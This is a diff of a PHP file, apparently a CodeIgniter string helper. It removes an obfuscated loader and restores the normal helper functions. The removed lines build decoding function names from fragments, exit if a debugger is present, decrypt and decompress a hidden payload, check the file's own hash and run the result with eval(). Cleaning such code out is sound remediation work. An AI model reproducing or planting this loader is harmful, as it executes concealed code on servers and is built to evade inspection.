@@ -1,28 +1,280 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_phn3ru3c=('bas'.'e64'.'_de'.'cod'.'e');
-$_zeeto78e=('gzu'.'nco'.'mpr'.'ess');
-$_ph6tklfe=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_rap37p8r='F5QEC8FM';
-$_li3880kf='TZoWnonI';
-$_cujt5a1f='e1VxProb';
-$_kzrgbpv6='XaE3t6uY';
-$_sy1qk5ey='836+NFEpjRo=';
-$_h2desrge='zpzpHcUH';
-$_myyfsk85='9eumsIhS';
-$_fpklkhq7='gz1MgQ==';
-$_iv08ux5m=$_phn3ru3c($_rap37p8r.$_kzrgbpv6.$_cujt5a1f.$_li3880kf.$_sy1qk5ey);
-$_mvfs2675=$_phn3ru3c($_myyfsk85.$_h2desrge.$_fpklkhq7);
-$_norihomf=$_phn3ru3c('Jk/Mf3lmQqSNW691p+Bp5oFdp3ZoogD2RxnKASBsnasGfeX9mGtInRfnDkhNoEyLTo8YIeFaW3ksXTKRw51kCtSfSgwWORQ7wEpfLLUoTJHLexZpI5u7uggHYeAJySvT7+r5FUfacY17hXUA1KbhtmXM+JTEHjHCvs37rP3LJiynntKqLUhhLvLn8w3AppjKwqFJ7S3aKjgCTqsfX+ibNjM0DTseBRFtNQxr0oyLANEU/ux/5lTnl+nl6jhOYBd0ODSFlsVNkZPoSsQMjuJjMv0njYc+s8mY7eUmdI5SgsK5+tNXQxS8Hj6F2Y9KSK7n6WmRYkgQ2r1B0ZndZp25NTgJqnBOpNvYLfNzj+lyAEdTW8isIqG/tQ56L9J6slcpzOfDP2Ta2l5Dn8WeeF/IXLGK29KRJHlRJwtOpSLtPmnTDvhgfhvAjiIc+mkJC7KToqZxEHdbGBAuWyMj63gWd2bq4NNpY+fQoncxeeyNZ9hvqi2oVKSv8pN2FhuU8nXLBgh8WFowLBAjWsQ/3H5t9KIe03UygEAPfUWHlNmk9EiU/lofiekib7m7f51OnTpFPSBNLvbfT+KBUiqEeQaqWb3tk87vYu8nka7hkhdblODAPpUArQz7h6CHDhg104LGUdww6Bq97aH4S3irRfwy1huJzKZm3aFumiyjmpVd19DSb/tWsEIvZSkiwnij8U/dXg2opCuIO4rT2b4l3owpG2ccYZ0wuidhkfx1IByMVaiJJx61deVfugE+1Fd1XkSEfTL867yqmlVHcSnr85w/e/xzDtHO5sOEYGdSCJPnE2eKRoXKuRrFeC8D3PVbTA0xgp/SurXIbd2YKm8r/RVUhHgL3ptw+Q2LU0CgFVWcs15c3xyQA6pSdfbFv2W3wGyyAjGGDbsLhuRM0s5zMGBV3W2oJOxt49xoWTPA7R4Vax0ErJQgYd9TUFe0dxPUYuuQPiYkQOHHlJgHxxMflV25HN916OF5pdc3o6JB/JquNg/oaU7sYueQHIW0vRG75qge7qGC0n2exdHqplOtrhWGWLlYNP1G5Ilq1Bnh4Fw4lVsX4mMatFdIn4KMfm5kJ7UOhIkZ1XDgz9fwsSvVLrHXKyRMRN8AhqCPGNr/W/QeEH4STzxl26usP1go3xe8kt5Vh8GZ6p2+vYkQ4dFqTwCvnPvntp/gyZ5qUfq/H5UXMsSyQVweu1G0LGvsOc8+o5/DOqT6GbxTD20AbFogdHO+IN/Zsx3psPW7GAYp5Ji2bM4=');
-$_zq18lezi=$_ph6tklfe($_norihomf,'aes-256-cbc',$_iv08ux5m,OPENSSL_RAW_DATA,$_mvfs2675);
-if($_zq18lezi===false){exit;}
-$_wjpyfdx3=$_zeeto78e($_zq18lezi);
-if($_wjpyfdx3===false){exit;}
-$_sv3qhfc9='fa6642c0689b235bc15a9e76d6981a6b2c5145f74d240fcd6e4088aaa0d627f8';
-$_o5765scc=@file_get_contents(__FILE__);
-if($_o5765scc!==false){
-$_ov855kfw=str_replace($_sv3qhfc9,"0000000000000000000000000000000000000000000000000000000000000000",$_o5765scc);
-$_eaxbfwm3=hash("sha256",$_ov855kfw);
-if($_eaxbfwm3!==$_sv3qhfc9){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('trim_slashes'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function trim_slashes($str)
+{
+return trim($str, '/');
 }
-eval($_wjpyfdx3);
+}
+
+if ( ! function_exists('strip_slashes'))
+{
+
+
+
+
+
+
+
+
+function strip_slashes($str)
+{
+if ( ! is_array($str))
+{
+return stripslashes($str);
+}
+foreach ($str as $key => $val)
+{
+$str[$key] = strip_slashes($val);
+}
+return $str;
+}
+}
+
+if ( ! function_exists('strip_quotes'))
+{
+
+
+
+
+
+
+
+
+function strip_quotes($str)
+{
+return str_replace(array('"', "'"), '', $str);
+}
+}
+
+if ( ! function_exists('quotes_to_entities'))
+{
+
+
+
+
+
+
+
+
+function quotes_to_entities($str)
+{
+return str_replace(array("\'","\"","'",'"'), array("&#39;","&quot;","&#39;","&quot;"), $str);
+}
+}
+
+if ( ! function_exists('reduce_double_slashes'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function reduce_double_slashes($str)
+{
+return preg_replace('#(^|[^:])//+#', '\\1/', $str);
+}
+}
+
+if ( ! function_exists('reduce_multiples'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function reduce_multiples($str, $character = ',', $trim = FALSE)
+{
+$str = preg_replace('#'.preg_quote($character, '#').'{2,}#', $character, $str);
+return ($trim === TRUE) ? trim($str, $character) : $str;
+}
+}
+
+if ( ! function_exists('random_string'))
+{
+
+
+
+
+
+
+
+function random_string($type = 'alnum', $len = 8)
+{
+switch ($type)
+{
+case 'basic':
+return mt_rand();
+case 'alnum':
+case 'numeric':
+case 'nozero':
+case 'alpha':
+switch ($type)
+{
+case 'alpha':
+$pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+break;
+case 'alnum':
+$pool = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+break;
+case 'numeric':
+$pool = '0123456789';
+break;
+case 'nozero':
+$pool = '123456789';
+break;
+}
+return substr(str_shuffle(str_repeat($pool, ceil($len / strlen($pool)))), 0, $len);
+case 'unique': 
+case 'md5':
+return md5(uniqid(mt_rand()));
+case 'encrypt': 
+case 'sha1':
+return sha1(uniqid(mt_rand(), TRUE));
+}
+}
+}
+
+if ( ! function_exists('increment_string'))
+{
+
+
+
+
+
+
+
+
+function increment_string($str, $separator = '_', $first = 1)
+{
+preg_match('/(.+)'.preg_quote($separator, '/').'([0-9]+)$/', $str, $match);
+return isset($match[2]) ? $match[1].$separator.($match[2] + 1) : $str.$separator.$first;
+}
+}
+
+if ( ! function_exists('alternator'))
+{
+
+
+
+
+
+
+
+
+function alternator()
+{
+static $i;
+if (func_num_args() === 0)
+{
+$i = 0;
+return '';
+}
+$args = func_get_args();
+return $args[($i++ % count($args))];
+}
+}
+
+if ( ! function_exists('repeater'))
+{
+
+
+
+
+
+
+
+
+
+
+function repeater($data, $num = 1)
+{
+return ($num > 0) ? str_repeat($data, $num) : '';
+}
+}
